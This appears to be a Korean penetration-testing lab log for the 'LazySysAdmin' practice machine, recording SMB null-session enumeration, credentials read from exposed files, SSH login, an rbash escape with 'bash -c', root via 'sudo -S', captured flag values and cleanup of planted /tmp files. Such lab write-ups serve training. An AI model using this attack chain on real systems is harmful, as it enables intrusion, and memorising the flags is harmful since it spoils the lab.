# LazySysAdmin — 실행 기록 (2026-08-20)

타겟 192.168.248.36 · Ubuntu 14.04.5 · Fundamental · **완료 2/2**
정찰 시작 16:43 KST → root 16:45 KST (약 3분). 이후 검증·산출물·노트.

## 경로
1. `nmap -p-` → 22/80/139/445/3306/6667(InspIRCd, top-1000 밖)
2. `smbclient -L -N` → `share$` (Sumshare) 널 세션 열람 가능. `map to guest = bad user` 때문.
3. `share$` = `/var/www/html/` (root 로 smb.conf 확인). `read only = yes`.
4. `deets.txt` → `Password 12345` / `wp-config.php` → `Admin:TogieMYSQL12345^^`
5. 사용자명: `rpcclient -U '' -N -c "lookupsids S-1-22-1-1000"` → `Unix User\togie`
   (`enum4linux -U` 는 Perl uninitialized 경고와 함께 빈 결과)
6. `ssh togie:12345` 성공. `id` 에 `27(sudo)`.
7. 셸이 `/bin/rbash` — `cd`·`/` 포함 명령·리다이렉션·`PATH` 대입 차단. PATH 는 기본값 그대로라 `bash -c` 로 탈출.
8. `sudo -n -l` 실패 → `echo 12345 | sudo -S -l` → `(ALL : ALL) ALL` → root

## 플래그 (2026-08-20 인스턴스)
| | 경로 | 값 | 셸 |
|---|---|---|---|
| user | `/home/togie/local.txt` | `3170c6b1e7bac5a3dc430b899115d3b4` | SSH 대화형(`-tt`) |
| root | `/root/proof.txt` | `09675eaefc242e881bcf18f83c340e90` | SSH + `sudo -S -i` |

증거: `~/PG/LazySysAdmin/proof_user.txt` · `proof_root.txt` (whoami/id/hostname/hostname -I/date + flag 한 화면)

## 헛다리 (실패 로그 8건)
| # | 시도 | 결과 |
|---|---|---|
| try1 | `ssh togie:12345` | 성공 (기록 보존용) |
| try2 | `smbclient put` → share$ | `NT_STATUS_ACCESS_DENIED` (read only) |
| try3 | `mysql -h` 원격 | `1130 Host not allowed` (호스트 ACL, 자격증명 문제 아님) |
| try4 | `enum4linux -U` | 빈 결과 + Perl 경고 |
| try5 | `ssh togie:TogieMYSQL12345^^` | `Permission denied` |
| try6 | `POST wp-login Admin:TogieMYSQL12345^^` | **302 → wp-admin (성공)** — 대체 foothold였음 |
| try7 | `POST wp-login togie:12345` | 200 (폼 재출력 = 실패) |
| try8 | rbash 제한 실측 | `cd: restricted` / `cannot specify '/'` / `PATH: readonly` |
| try9 | `sftp` 직접 | `Connection closed` — scp 실패 원인 규명 |

추가로 `scp` 최초 실패(`Connection closed`)는 rbash 가 sftp 서브시스템(`/usr/lib/openssh/sftp-server`, `/` 포함)을 거부한 것. `scp -O`(legacy, 원격 명령이 `scp -t`) 로 통과.

미시도(sudo 로 이미 root라 불필요): `/usr/bin/pkexec` PwnKit(CVE-2021-4034), 커널 4.4.0-31 로컬 익스플로잇. 노트에 `[가정]` 표기.

## harvest.sh 개정 (공용 자산)
`~/PG/_lib/harvest.sh` SUDO 섹션에 2줄 추가 — `HARVEST_PW` 가 설정돼 있으면 `echo "$HARVEST_PW" | sudo -S -l` 을 추가로 실행.
이 박스에서 `sudo -n -l` 만으로는 `(ALL : ALL) ALL` 을 놓쳤다. 백업 `~/PG/_lib/harvest.sh.bak-lsa`. `sh -n` 통과, 섹션 19개 유지, 89→91행. 타겟에서 실동작 확인.

## 정리
- 타겟: `/tmp/.h.sh`·`/tmp/.h/`·`/tmp/zz` 삭제 확인 (`ls -la /tmp` 에 `vmware-root` 만 남음)
- Kali: tmux `lsa_nmap` 종료 확인, `ss -lntp` 에 잔존 리스너 없음. 다른 세션은 없었다.
- 미확인: `/var/log/auth.log`·`wtmp` 의 SSH/sudo 기록(지우지 않음), `~togie/.bash_history`

## 산출물 — `kali:~/PG/LazySysAdmin/` (31개)
`nmap.log` `nmap.full.txt` `quick.log` `smb_shares.txt` `smb_share_ls.txt` `deets.txt` `todolist.txt` `robots.txt` `info.php` `wp-config.php` `web_index.html` `wp_home.html` `smb_conf_share.txt` `harvest_togie.txt` `harvest_root.txt` `proof_user.txt` `proof_root.txt` `try1~try9`·`try_sudo_l.log` `writeup_notes.txt` 스크린샷 3장

스크린샷 볼트 반입 2장: `파일보관\PG-LazySysAdmin-index.png` · `PG-LazySysAdmin-wordpress.png`
(wp-login 캡처는 정보가 없어 폐기)
